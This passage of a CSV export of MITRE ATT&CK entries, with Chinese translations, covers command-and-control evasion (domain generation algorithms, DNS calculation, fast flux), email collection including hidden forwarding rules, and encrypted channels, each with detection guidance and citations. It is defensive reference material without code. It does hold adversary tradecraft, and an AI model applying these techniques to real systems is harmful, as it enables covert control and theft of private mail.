2019),(Citation: TrendMicro EarthLusca 2022),(Citation: Symantec Patchwork),(Citation: ESET Windigo Mar 2014),(Citation: ESET LoudMiner June 2019),(Citation: Google TAG Lazarus Jan 2021),(Citation: ESET ComRAT May 2020),(Citation: Kaspersky Darkhotel),(Citation: Bitdefender StrongPity June 2020),(Citation: Symantec Elderwood Sept 2012),(Citation: Dell TG-3390),(Citation: objective-see windtail1 dec 2018),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: AhnLab Andariel Subgroup of Lazarus June 2018),(Citation: ESET OceanLotus),(Citation: Secureworks IRON LIBERTY July 2019),(Citation: Security Affairs Elderwood Sept 2012),(Citation: Securelist ScarCruft Jun 2016),(Citation: TrendMicro New Andariel Tactics July 2018),(Citation: Volexity Patchwork June 2018),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: FireEye APT38 Oct 2018),(Citation: CISA AA21-200A APT40 July 2021),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Securelist Machete Aug 2014),(Citation: Gigamon Berserk Bear October 2021),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Secureworks IRON HUNTER Profile),(Citation: US-CERT TA18-074A),(Citation: Cisco Group 72),(Citation: Symantec Leafminer July 2018),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Microsoft PLATINUM April 2016),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: Unit 42 ProjectM March 2016),(Citation: Cylance Dust Storm),(Citation: FireEye APT37 Feb 2018),(Citation: TechNet Moving Beyond EMET),(Citation: Wikipedia Control Flow Integrity),(Citation: Windows Blogs Microsoft Edge Sandbox),(Citation: Ars Technica Pwn2Own 2017 VM Escape)",篡改访问工具/网站挂马攻击,攻击者可能通过在正常浏览过程中访问网站的用户访问系统。使用这种技术，用户的 Web 浏览器通常会成为攻击的目标，但攻击者也可能会使用受感染的网站进行非利用行为，例如获取 [应用程序访问令牌](https://attack.mitre.org/techniques/T1550/001 ）。存在多种向浏览器提供漏洞利用代码的方法，包括： * 合法网站受到攻击，攻击者注入了某种形式的恶意代码，例如 JavaScript、iFrames 和跨站点脚本。 * 恶意广告是通过合法的广告提供商付费和投放的。 * 内置 Web 应用程序接口可用于插入任何其他类型的对象，这些对象可用于显示 Web 内容或包含在访问客户端上执行的脚本（例如论坛帖子、评论和其他用户可控制的 Web 内容） .攻击者使用的网站通常是由特定社区（例如政府、特定行业或地区）访问的网站，其目标是基于共同利益损害特定用户或一组用户。这种有针对性的活动通常被称为战略网络妥协或水坑攻击。这种情况有几个已知的例子。（引用：Shadowserver Strategic Web Compromise） 典型的偷渡式妥协过程： 1. 用户访问用于托管对手控制内容的网站。 2. 脚本自动执行，通常在浏览器和插件版本中搜索可能存在漏洞的版本。 * 用户可能需要通过启用脚本或活动网站组件并忽略警告对话框来协助此过程。 3. 找到易受攻击的版本后，将利用代码传递到浏览器。 4. 如果利用成功，除非有其他保护措施，否则它将在用户系统上执行攻击者代码。 * 在某些情况下，在交付利用代码之前，需要在初始扫描后再次访问该网站。与 [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) 不同，该技术的重点是在访问网站时利用客户端终端上的软件。这通常会让攻击者访问内部网络上的系统，而不是可能位于 DMZ 中的外部系统。攻击者还可能使用受感染的网站将用户传送到旨在 [窃取应用程序访问令牌](https://attack.mitre.org/techniques/T1528) 的恶意应用程序，例如 OAuth 令牌，以获取对受保护应用程序的访问权限和信息。这些恶意应用程序已通过合法网站上的弹出窗口传递。（引用：Volexity OceanLotus Nov 2017）
T1568,Dynamic Resolution,"Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.

Adversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",https://attack.mitre.org/techniques/T1568,10 March 2020,11 March 2022,1.0,Command and Control,"Detecting dynamically generated C2 can be challenging due to the number of different algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There are multiple approaches to detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more (Citation: Data Driven Security DGA). CDN domains may trigger these detections due to the format of their domain names. In addition to detecting algorithm generated domains based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.","Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,Chris Roffe,User,,,,,,"(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: ESET Gelsemium June 2021),(Citation: McAfee Night Dragon),(Citation: Unit 42 Gamaredon February 2022),(Citation: Kaspersky Tomiris Sep 2021),(Citation: ESET Operation Spalax Jan 2021),(Citation: Volexity SolarWinds),(Citation: McAfee Maze March 2020),(Citation: FireEye APT30),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Cylance Dust Storm),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: CheckPoint Redaman October 2019),(Citation: Unit42 Redaman January 2019),(Citation: Cybereason Dissecting DGAs),(Citation: Cisco Umbrella DGA Brute Force)",动态解析/动态域名解析,攻击者可以动态建立与指挥和控制基础设施的连接，以逃避常见的检测和补救措施。这可以通过使用与对手用来接收恶意软件通信的基础设施共享通用算法的恶意软件来实现。这些计算可用于动态调整恶意软件用于命令和控制的域名、IP 地址或端口号等参数。攻击者可能会出于 [Fallback Channels] (https://attack.mitre.org/techniques/T1008) 的目的使用动态解决方案。当与主要命令和控制服务器失去联系时，恶意软件可能会采用动态解析作为重新建立命令和控制的手段。（引用：Talos CCleanup 2017）（引用：FireEye POHSPY 2017 年 4 月）（引用：ESET Sednit 2017 活动）
T1568.003,Dynamic Resolution: DNS Calculation,"Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.(Citation: Meyers Numbered Panda)

One implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.(Citation: Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)",https://attack.mitre.org/techniques/T1568/003,11 March 2020,27 March 2020,1.0,Command and Control,Detection for this technique is difficult because it would require knowledge of the specific implementation of the port calculation algorithm. Detection may be possible by analyzing DNS records if the algorithm is known.,"Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1568,,,,,,,,,"(Citation: Meyers Numbered Panda),",动态解析/动态域名解析：DNS 计算,攻击者可能会对 DNS 结果中返回的地址进行计算，以确定将哪个端口和 IP 地址用于命令和控制，而不是依赖于预定的端口号或实际返回的 IP 地址。 IP 和/或端口号计算可用于绕过 C2 通道上的出口过滤。（引用：Meyers Numbered Panda）[DNS 计算]的一种实现（https://attack.mitre.org/techniques/T1568/003 ) 是在 DNS 响应中获取 IP 地址的前三个八位字节，并使用这些值来计算命令和控制流量的端口。（引用：Meyers Numbered Panda）（引用：Moran 2014）（引用：Rapid7G20Espionage）
T1568.002,Dynamic Resolution: Domain Generation Algorithms,"Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)

DGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)

Adversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",https://attack.mitre.org/techniques/T1568/002,10 March 2020,11 March 2022,1.0,Command and Control,"Detecting dynamically generated domains can be challenging due to the number of different DGA algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There is a myriad of approaches for detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more.(Citation: Data Driven Security DGA) CDN domains may trigger these detections due to the format of their domain names. In addition to detecting a DGA domain based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.

Machine learning approaches to detecting DGA domains have been developed and have seen success in applications. One approach is to use N-Gram methods to determine a randomness score for strings used in the domain name. If the randomness score is high, and the domains are not whitelisted (CDN, etc), then it may be determined if a domain is related to a legitimate host or DGA.(Citation: Pace University Detecting DGA May 2017) Another approach is to use deep learning to classify domains as DGA-generated.(Citation: Elastic Predicting DGA)","Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow",True,T1568,,"Barry Shteiman, Exabeam; Ryan Benson, Exabeam; Sylvain Gil, Exabeam",User,,,,,,"(Citation: Talos CCleanup 2017),(Citation: ProofPoint Ursnif Aug 2016),(Citation: Secureworks GOLD CABIN),(Citation: ESET Ebury Feb 2014),(Citation: CheckPoint Naikon May 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: Zdnet Ngrok September 2018),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Accenture Lyceum Targets November 2021),(Citation: FireEye APT41 Aug 2019),(Citation: Trend Micro Qakbot May 2020),(Citation: FireEye POSHSPY April 2017),(Citation: Cybereason Astaroth Feb 2019),(Citation: Cybereason Bazar July 2020),(Citation: ESET Ebury Oct 2017),(Citation: ESET Dukes October 2019),(Citation: SANS Conficker),(Citation: Unit 42 TA551 Jan 2021),(Citation: ESET Grandoreiro April 2020),(Citation: BlackBerry CostaRicto November 2020),(Citation: ESET Sednit 2017 Activity),(Citation: Trend Micro Conficker),(Citation: FireEye APT34 Dec 2017),(Citation: Prevailion DarkWatchman 2021),(Citation: Securelist ShadowPad Aug 2017),(Citation: Intezer Doki July 20),(Citation: Cybereason Dissecting DGAs),(Citation: Akamai DGA Mitigation),(Citation: Cisco Umbrella DGA Brute Force)",动态解析/动态域名解析：域生成算法,攻击者可能会利用域生成算法 (DGA) 来动态识别命令和控制流量的目标域，而不是依赖静态 IP 地址或域的列表。这样做的好处是让防御者更难阻止、跟踪或接管命令和控制通道，因为恶意软件可能会检查数千个域以获取指令。（引用：Cybereason Dissecting DGA）（引用： Cisco Umbrella DGA）（引用：Unit 42 DGA Feb 2019）DGA 在通过生成每个字母来构建域名时，可以采用明显随机或“乱码”字符串的形式（例如：istgmxdejdnxuyla.ru）。或者，一些 DGA 通过将单词连接在一起而不是字母来使用整个单词作为单位（例如：cityjulydish.net）。许多 DGA 是基于时间的，为每个时间段（每小时、每天、每月等）生成不同的域。其他人也包含种子值，以使防御者更难以预测未来的域。（引用：Cybereason Dissecting DGA）（引用：Cisco Umbrella DGA）（引用：Talos CCleanup 2017）（引用：Akamai DGA 缓解）攻击者可能会使用 DGA [Fallback Channels](https://attack.mitre.org/techniques/T1008) 的目的。当与主要命令和控制服务器失去联系时，恶意软件可能会使用 DGA 作为重新建立命令和控制的手段。（引用：Talos CCleanup 2017）（引用：FireEye POHSPY 2017 年 4 月）（引用：ESET Sednit 2017 活动）
T1568.001,Dynamic Resolution: Fast Flux DNS,"Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity)

The simplest, ""single-flux"" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)

In contrast, the ""double-flux"" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",https://attack.mitre.org/techniques/T1568/001,11 March 2020,27 March 2020,1.0,Command and Control,"In general, detecting usage of fast flux DNS is difficult due to web traffic load balancing that services client requests quickly. In single flux cases only IP addresses change for static domain names. In double flux cases, nothing is static. Defenders such as domain registrars and service providers are likely in the best position for detection.","Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow",True,T1568,,,,,,,,,"(Citation: Trend Micro njRAT 2018),(Citation: Gh0stRAT ATT March 2019),(Citation: Trend Micro TA505 June 2019),(Citation: Korean FSI TA505 2020),(Citation: District Court of NY APT10 Indictment December 2018),",动态解析/动态域名解析：Fast Flux DNS,攻击者可能会使用 Fast Flux DNS 将命令和控制通道隐藏在与单个域解析相关联的一系列快速变化的 IP 地址后面。该技术使用完全限定的域名，分配给它的多个 IP 地址以高频率交换，使用循环 IP 寻址和短生存时间 (TTL) 的组合用于 DNS 资源记录。（引用： MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity) 最简单的“single-flux”方法涉及将地址注册和注销作为单个 DNS 名称的 DNS A（地址）记录列表的一部分。这些注册的平均生命周期为 5 分钟，导致 IP 地址解析的不断洗牌。（引用：Fast Flux - Welivesecurity）相比之下，“双通量”方法将地址注册和取消注册为 DNS 的一部分DNS 区域的名称服务器记录列表，为连接提供额外的弹性。使用双通量附加主机可以充当 C2 主机的代理，进一步隔离 C2 通道的真实来源。
T1114,Email Collection,"Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. ",https://attack.mitre.org/techniques/T1114,31 May 2017,15 October 2021,2.3,Collection,"There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.

File access of local system email files for Exfiltration, unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.

Monitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

Detection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account.

Auto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include <code>X-MS-Exchange-Organization-AutoForwarded</code> set to true, <code>X-MailFwdBy</code> and <code>X-Forwarded-To</code>. The <code>forwardingSMTPAddress</code> parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) High volumes of emails that bear the <code>X-MS-Exchange-Organization-AutoForwarded</code> header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.","Google Workspace, Linux, Office 365, Windows, macOS","Application Log: Application Log Content, Command: Command Execution, File: File Access, Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation",False,,,"Swetha Prabakaran, Microsoft Threat Intelligence Center (MSTIC)",User,,,,,,"(Citation: DOJ Iran Indictments March 2018),(Citation: Certfa Charming Kitten January 2021),(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)",电子邮件收集,攻击者可能会针对用户电子邮件来收集敏感信息。电子邮件可能包含对对手有价值的敏感数据，包括商业机密或个人信息。攻击者可以从邮件服务器或客户端收集或转发电子邮件。
T1114.003,Email Collection: Email Forwarding Rule,"Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation: Mac Forwarding Rules)

Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.(Citation: Pfammatter - Hidden Inbox Rules)",https://attack.mitre.org/techniques/T1114/003,19 February 2020,15 October 2021,1.2,Collection,"Detection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account. This is especially true in cases with hidden auto-forwarding rules. This makes it only possible to reliably detect the existence of a hidden auto-forwarding rule by examining message tracking logs or by using a MAPI editor to notice the modified rule property values.(Citation: Pfammatter - Hidden Inbox Rules)

Auto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include `X-MS-Exchange-Organization-AutoForwarded` set to true, `X-MailFwdBy` and `X-Forwarded-To`. The `forwardingSMTPAddress` parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) High volumes of emails that bear the `X-MS-Exchange-Organization-AutoForwarded` header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.","Google Workspace, Linux, Office 365, Windows, macOS",Application Log: Application Log Content,True,T1114,,"Microsoft Security; Swetha Prabakaran, Microsoft Threat Intelligence Center (MSTIC)",User,,,,,,"(Citation: DOJ Iran Indictments March 2018),(Citation: CISA AA20-301A Kimsuky),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Microsoft BEC Campaign),(Citation: Pfammatter - Hidden Inbox Rules),(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)",电子邮件收集：电子邮件转发规则,攻击者可能会设置电子邮件转发规则来收集敏感信息。攻击者可能会滥用电子邮件转发规则来监控受害者的活动、窃取信息并进一步获取有关受害者或受害者组织的情报，以用作进一步利用或操作的一部分。（引用：US-CERT TA18-068A 2018）此外，电子邮件转发规则可以让攻击者保持对受害者电子邮件的持久访问，即使在管理员重置了受损凭据之后也是如此。（引用：Pfammtter - 隐藏收件箱规则）大多数电子邮件客户端允许用户为各种电子邮件功能创建收件箱规则，包括转发到不同的收件人。这些规则可以通过本地电子邮件应用程序、Web 界面或命令行界面创建。消息可以转发给内部或外部收件人，并且没有限制此规则范围的限制。管理员还可以为具有相同考虑和结果的用户帐户创建转发规则。（引用：Microsoft Tim McMichael Exchange 邮件转发 2）（引用：Mac 转发规则）组织内的任何用户或管理员（或具有有效凭据的对手）都可以创建规则自动将所有收到的邮件转发给另一个收件人，根据发件人将电子邮件转发到不同的位置等等。攻击者还可以通过使用 Microsoft 消息传递 API (MAPI) 修改规则属性来隐藏规则，使其在 Outlook、OWA 或大多数 Exchange 管理工具中隐藏且不可见。（引用：Pfammatter - 隐藏收件箱规则）
T1114.001,Email Collection: Local Email Collection,"Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.

Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\Users\<username>\Documents\Outlook Files` or `C:\Users\<username>\AppData\Local\Microsoft\Outlook`.(Citation: Microsoft Outlook Files)",https://attack.mitre.org/techniques/T1114/001,19 February 2020,24 March 2020,1.0,Collection,Monitor processes and command-line arguments for actions that could be taken to gather local email files. Monitor for unusual processes accessing local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).,Windows,"Command: Command Execution, File: File Access",True,T1114,,,User,,,,,,"(Citation: Talos Smoke Loader July 2018),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: NCC Group Chimera January 2021),(Citation: McAfee Night Dragon),(Citation: GitHub Pupy),(Citation: Trend Micro Qakbot December 2020),(Citation: FireEye APT35 2018),(Citation: Mandiant APT1),(Citation: FireEye CARBANAK June 2017),(Citation: Trend Micro Muddy Water March 2021),(Citation: F-Secure Cosmicduke),(Citation: CIS Emotet Dec 2018),(Citation: Github PowerShell Empire),(Citation: Kaspersky QakBot September 2021),(Citation: Kroll Qakbot June 2020),(Citation: Cybereason Kimsuky November 2020),",电子邮件收集：本地电子邮件收集,攻击者可能会针对本地系统上的用户电子邮件来收集敏感信息。可以从用户的本地系统获取包含电子邮件数据的文件，例如 Outlook 存储或缓存文件。 Outlook 将数据本地存储在扩展名为 .ost 的脱机数据文件中。 Outlook 2010 及更高版本支持最大 50GB 的 .ost 文件大小，而早期版本的 Outlook 支持最大 20GB。（引文：Outlook 文件大小）Outlook 2013（及更早版本）中的 IMAP 帐户和 POP 帐户使用 Outlook 数据文件 (.pst)与 .ost 不同，而 Outlook 2016（及更高版本）中的 IMAP 帐户使用 .ost 文件。这两种类型的 Outlook 数据文件通常存储在 `C:\Users\<username>\Documents\Outlook Files` 或 `C:\Users\<username>\AppData\Local\Microsoft\Outlook` 中。（引用：Microsoft Outlook文件）
T1114.002,Email Collection: Remote Email Collection,"Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.",https://attack.mitre.org/techniques/T1114/002,19 February 2020,25 March 2021,1.1,Collection,"Monitor for unusual login activity from unknown or abnormal locations, especially for privileged accounts (ex: Exchange administrator account).","Google Workspace, Office 365, Windows","Command: Command Execution, Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation",True,T1114,,,,,,,,,"(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Cybereason Valak May 2020),(Citation: Mandiant APT1),(Citation: Volexity SolarWinds),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Microsoft NICKEL December 2021),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: DOJ GRU Indictment Jul 2018),(Citation: GitHub MailSniper),(Citation: Volexity Exchange Marauder March 2021),(Citation: Symantec Seaduke 2015),(Citation: Microsoft HAFNIUM March 2020),(Citation: NCC Group Chimera January 2021),(Citation: NCC Group APT15 Alive and Strong),(Citation: KISA Operation Muzabi),(Citation: US-CERT TA18-074A),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Symantec Leafminer July 2018),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: ESET LightNeuron May 2019),",电子邮件收集：远程电子邮件收集,攻击者可能会针对 Exchange 服务器、Office 365 或 Google Workspace 收集敏感信息。攻击者可能会利用用户的凭据并直接与 Exchange 服务器交互以从网络内获取信息。攻击者还可以访问面向外部的 Exchange 服务、Office 365 或 Google Workspace，以使用凭据或访问令牌访问电子邮件。 [MailSniper](https://attack.mitre.org/software/S0413) 等工具可用于自动搜索特定关键字。
T1573,Encrypted Channel,"Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",https://attack.mitre.org/techniques/T1573,16 March 2020,20 April 2021,1.0,Command and Control,"SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)

In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,False,,,,,,,,,,"(Citation: Threatpost Lizar May 2021),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Cybereason PowerLess February 2022),(Citation: Gh0stRAT ATT March 2019),(Citation: Cybereason Chaes Nov 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: Secureworks IRON HEMLOCK Profile),(Citation: ESET DazzleSpy Jan 2022),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: BiZone Lizar May 2021),",加密通道,攻击者可以使用已知的加密算法来隐藏命令和控制流量，而不是依赖通信协议提供的任何固有保护。尽管使用了安全算法，但如果在恶意软件样本/配置文件中编码和/或生成密钥，这些实现可能容易受到逆向工程的影响。
T1573.002,Encrypted Channel: Asymmetric Cryptography,"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.

For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).",https://attack.mitre.org/techniques/T1573/002,16 March 2020,20 April 2021,1.0,Command and Control,"SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)

In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1573,,,,,,,,,"(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Zscaler Bazar September 2020),(Citation: CISA ComRAT Oct 2020),(Citation: Group IB Cobalt Aug 2017),(Citation: CISA WellMail July 2020),(Citation: PWC WellMess July 2020),(Citation: Leonardo Turla Penquin May 2020),(Citation: IBM Grandoreiro April 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: Secureworks Karagany July 2019),(Citation: Github PowerShell Empire),(Citation: Talos TinyTurla September 2021),(Citation: FoxIT Wocao December 2019),(Citation: IBM IcedID November 2017),(Citation: Talos PoetRAT April 2020),(Citation: GitHub Pupy),(Citation: Dingledine Tor The Second-Generation Onion Router),(Citation: NCSC APT29 July 2020),(Citation: Proofpoint TA505 Jan 2019),(Citation: Blasco 2013),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: NCSC Cyclops Blink February 2022),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: FireEye FiveHands April 2021),(Citation: ESET Zebrocy Nov 2018),(Citation: ESET Sednit Part 2),(Citation: ESET ComRAT May 2020),(Citation: Fidelis Hi-Zor),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: Talos Promethium June 2020),(Citation: FireEye POSHSPY April 2017),(Citation: SecureWorks WannaCry Analysis),(Citation: ESET Zebrocy May 2019),(Citation: Cylance Machete Mar 2017),(Citation: FireEye MuddyWater Mar 2018),(Citation: GitHub Sliver Encryption),(Citation: PWC WellMess C2 August 2020),(Citation: Bitdefender APT28 Dec 2015),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: US-CERT Volgmer Nov 2017),(Citation: Trend Micro Emotet Jan 2019),(Citation: ESET Kobalos Jan 2021),(Citation: Github Koadic),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: Group IB GrimAgent July 2021),(Citation: Invincea XTunnel),(Citation: Mandiant APT1 Appendix),(Citation: Securelist APT10 